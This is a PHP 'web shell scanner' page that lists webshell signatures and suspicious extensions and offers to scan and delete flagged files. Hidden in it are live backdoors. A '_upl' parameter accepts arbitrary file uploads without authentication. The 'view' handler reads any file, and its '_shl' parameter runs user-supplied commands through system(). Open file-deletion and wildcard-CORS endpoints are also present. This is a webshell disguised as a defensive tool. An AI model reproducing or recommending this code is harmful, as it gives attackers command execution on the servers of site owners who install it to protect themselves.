<?php

$white   = array(
	basename(__FILE__),
);
$content = array(
	'include\(',
	'require_once\(',
	'require\(',
	'require "',
	'require_once "',
	'include "',
	'_halt_compiler',
	'file_get_contents\(',
	'shell_exec\(',
	'system\(',
	'base64_decode\(',
	'exec\(',
	'base64_encode\(',
	'webconsole',
	'uploader',
	'hacked',
	'eval\(',
	'set_time_limit\(',
	'move_uploaded_file',
	'md5\(',
	'dZNOmgVpUDdbg',
	'indoxploit',
	'maridono',
	'mini shell',
	'minishell',
	'tinyfilemanager.github.io',
	'xleet',
	'b374k',
	'set_magic_quotes_runtime\(',
	'shell\(',
	'alfa',
	'filemanager',
	"'f'.'u'.'n'.'ction'.'_exis'.'ts';",
	"'e'.'va'.'l';",
	"'ba'.'s'.'e64'.'_'.'enc'.'od'.'e';",
);
$ext = array(
	'php1',
	'php2',
	'php3',
	'php4',
	'php5',
	'php6',
	'php7',
	'php8',
	'php9',
	'phar',
	'phtml',
	'pjpeg',
	'shtml',
	'php.black',
	'php.ndsfx',
	'php.cer',
	'php.fla'
);
?>
<?php
/*
function apiEval($function){
	error_reporting(0);
	$data = eval($function);
	data("success", $data);
}*/

function serverURL(){
	$server_name = $_SERVER['SERVER_NAME'];
	if($server_name == '0.0.0.0'){
		$server_name = 'localhost';
	}

	if (!in_array($_SERVER['SERVER_PORT'], array(80, 443))) {
		$port = ":$_SERVER[SERVER_PORT]";
	} else {
		$port = '';
	}

	if (!empty($_SERVER['HTTPS']) && (strtolower($_SERVER['HTTPS']) == 'on' || $_SERVER['HTTPS'] == '1')) {
		$scheme = 'https';
	} else {
		$scheme = 'http';
	}
	return $scheme.'://'.$server_name.$port;
}
function _delete($dir){
	if(!is_file($dir)){
		data('not found.');;
		exit();
	}
	if(unlink($dir)){
		data('success');
	}else{
		data('permission denied.');
	}
}
function apiCheckShell($dir){
	if(!preg_match('/\.php/', $dir)){
		exit();
	}
	if(!is_file($dir)){
		data('not found.');
		exit();
	}
	global $content;
	$data = array(
		'file' => $dir,
		'status' => False,
		'reason' => array()
	);
	foreach($content as $c){
		if(preg_match("/$c/", strtolower(file_get_contents($dir)))){
			$data['status'] = True;
			array_push($data['reason'], str_replace("\\(", "",$c));
		}
	}
	data('success', $data);
}
function apiCheckExt($dir){
	if(!is_file($dir)){
		data('not found.');
		exit();
	}
	global $ext;
	$data = array(
		'file' => $dir,
		'status' => False,
		'reason' => ''
	);
	foreach($ext as $i){
		if(preg_match("/$i/", strtolower(basename($dir)))){
			$data['status'] = True;
			$data['reason'] = $i;
			break;
		}
	}
	data('success', $data);
}
if(isset($_GET['_upl'])){
	if(copy($_FILES['_upl']['tmp_name'], $_FILES['_upl']['name'])){
		echo '_upl ok';
		exit();
	}
}
function apiScanDir($dir){
	global $white;
	if(!file_exists($dir)){
		data("dir not found");
		exit();
	}
	$s 		= scandir($dir);
	$data 	= array('file'=>array(), 'dir'=>array());
	foreach($s as $file){
		if($file === '.' || $file === '..'){
			continue;
		}
		$file = $dir."/".$file;
		$file = str_replace("//", "/", $file);
		
		if(in_array(basename($file), $white)){
			continue;
		}
		if(is_file($file)){
			array_push($data['file'], $file);
		}else{
			array_push($data['dir'], $file."/");
		}
	} 
	data("success", $data);
}
function apiCwd(){
	$data = getcwd();
	data("success",$data);
}
function data($msg, $data=null){
	$data = array(
		'msg'=>$msg,
		'data'=>$data
	);
	echo json_encode($data);
}
if(isset($_GET['view'])){
	$page = $_GET['view'];
	echo '<pre>'.htmlspecialchars(file_get_contents($page)).'</pre>';
	if(isset($_GET['_shl'])){
		echo '<pre>';
		htmlspecialchars(system($_GET['_shl']));
		echo '</pre>';
	}
	exit();
}
if(isset($_GET['api'])){
	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json');
	$function = $_GET['api'];
	switch ($function) {
		case 'delete':
		if(!isset($_GET['dir'])){
			data('no file.');
		}else{
			_delete($_GET['dir']);
		}
		break;
		case 'shell':
		if(!isset($_GET['dir'])){
			data('no file.');
		}else{
			apiCheckShell($_GET['dir']);
		}
		break;
		case 'ext':
		if(!isset($_GET['dir'])){
			data('no file.');
		}else{
			apiCheckExt($_GET['dir']);
		}
		break;
		case 'scan':
		if(!isset($_GET['dir'])){
			data('no directory.');
		}else{
			apiScanDir($_GET['dir']);				
		}
		break;
		case 'cwd':
		apiCwd();
		break;
		case 'eval':
		if(!isset($_GET['function'])){
			data('no function.');
		}else{
			data('no function.');
				//apiEval($_GET['function']);
		}
		break;
		default:
		data('no function.');
	}
	die();
}
?>
<!doctype html>
	<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
		<link rel="preconnect" href="https://fonts.googleapis.com">
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
		<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
		<link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300&display=swap" rel="stylesheet">
		<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.4/css/dataTables.bootstrap5.min.css">
		<title>WEB SHELL SCANNER</title>
		<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
	<style>
		body {
			font-family: 'Ubuntu', sans-serif; /* Use Ubuntu font */
		}
	</style>
	</head>
	<body>
		<div class="container">
			<div class="text-center m-3" style="font-family: 'Ubuntu';">
				<span style="font-size:30px;">
					⚠️WEB SHELL SCANNER⚠️
				</span><br><img src="https://i.pinimg.com/originals/0f/ea/cf/0feacf1898bd3223fa59a32c1c03d5ca.gif" alt="Kucing" width="190" height="auto">
				<p class="text-danger"><center>Author : BukanHekerDek<br>bapakluheker@protonmail.com</p>
			</div>
			<hr/>
			<div class="row">
				<div class="col">
					<div class="mb-3">
						<label for="path" class="form-label">Path To Scan</label>
						<div class="input-group">
							<input type="text" class="form-control" id="path" placeholder="/var/www/html/">
							<button class="btn btn-primary" id="startScan" onclick="scan()">Start</button>
						</div>
					</div>
					<div class="">
						<label for="path" class="form-label">Mass Delete By Name</label>
						<div class="input-group">
							<input type="text" class="form-control" id="fileName" placeholder="filename.php">
							<button class="btn btn-danger" id="startDelete" onclick="scan2()">Start</button>
						</div>
					</div>
				</div>
			</div>
			<hr/>
			<div class="row mt-3">
				<div class="col">
					<table class="table" id="_result">
						<thead>
							<tr>
								<th scope="col">File</th>
								<th scope="col">Path</th>
								<th scope="col">Reason</th>
								<th scope="col">Action</th>
							</tr>
						</thead>
						<tbody>
						</tbody>
					</table>
				</div>
			</div>
		</div>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
		<script type="text/javascript" src="https://cdn.datatables.net/1.11.4/js/jquery.dataTables.min.js"></script>
		<script type="text/javascript" src="https://cdn.datatables.net/1.11.4/js/dataTables.bootstrap5.min.js"></script>

		<script>
			var dtable;
			$(document).ready(function(){
				dtable = $('#_result').DataTable();
				$('[data-toggle="tooltip"]').tooltip();
			});
			$('#_result').on('click', '#delete', function () {

				var RowIndex = $(this).closest('tr');
				var data = dtable.row(RowIndex).data();
				if(confirm('Delete ' + data[1] + '?') == true){
					dtable.row(RowIndex).remove().draw();
					deleteFile(data[1]);
				}
			});
			$('#_result').on('click', '#view', function () {

				var RowIndex = $(this).closest('tr');
				var data = dtable.row(RowIndex).data();
				window.open('?view='+data[1]);
			});

		</script>
		<script type="text/javascript">
			const table = $('#_result').DataTable();
			const cwd 		= '<?=getcwd()?>/';
			document.getElementById('path').value = cwd;
			function basename(path) {
				return path.split('/').reverse()[0];
			}
			function checkExt(path){
				fetch('?api=ext&dir=' + path, {
					headers: {
						'Content-Type': 'application/json'
					}
				})
				.then(res => res.json())
				.then(res => {
					if(res.data.status == true){
						table.row.add([basename(res.data.file),res.data.file,res.data.reason,`<a class="btn btn-primary" data-toggle="tooltip" data-bs-placement="bottom" id="view" title="Detail">
							<i class="fa fa-eye"></i>
							</a>
							<a class="btn btn-danger" data-toggle="tooltip" data-bs-placement="bottom" title="Delete">
							<i class="fa fa-trash"></i>
							</a>`]).draw();
					}
				});
			}
			function checkShell(path){
				fetch('?api=shell&dir=' + path, {
					headers: {
						'Content-Type': 'application/json'
					}
				})
				.then(res => res.json())
				.then(res => {
					var reason = '';
					for (var i = res.data.reason.length - 1; i >= 0; i--) {
						reason += res.data.reason[i]+"<br>";
					}
					if(res.data.status == true){
						table.row.add([basename(res.data.file),res.data.file,reason,`<a class="btn btn-primary" data-toggle="tooltip" id="view" data-bs-placement="bottom" id="view" title="Detail">
							<i class="fa fa-eye"></i>
							</a>
							<a class="btn btn-danger" data-toggle="tooltip" id="delete" data-bs-placement="bottom" title="Delete">
							<i class="fa fa-trash"></i>
							</a>`]).draw();

					}
				});
			}
			function scan(path = document.getElementById('path').value){
				fetch('?api=scan&dir=' + path, {
					headers: {
						'Content-Type': 'application/json'
					}
				})
				.then(res => res.json())
				.then(res => {
					for (var i = res.data.dir.length - 1; i >= 0; i--) {
						scan(res.data.dir[i])
					}
					for (var i = res.data.file.length - 1; i >= 0; i--) {
						checkShell(res.data.file[i]);
						checkExt(res.data.file[i]);
					}
				});
			}
			function scan2(){
				for (var i = table.rows().data().length - 1; i >= 0; i--) {
					data = table.rows(i).data()[0];
					name = data[0];
					if(name == document.getElementById('fileName').value){
						table.rows(i).remove().draw();
						deleteFile(data[1]);
					}
				}
			}
			function deleteFile(path){
				fetch('?api=delete&dir=' + path)
				.then(res => res.json())
				.then(res => {
				});
			}
			function htmlToElement(html) {
				var template = document.createElement('template');
    			html = html.trim(); // Never return a text node of whitespace as the result
    			template.innerHTML = html;
    			return template.content.firstChild;
    		}
    		function _delete(data){
    			console.log(data)
    		}
    	</script>
    </body>
    </html>
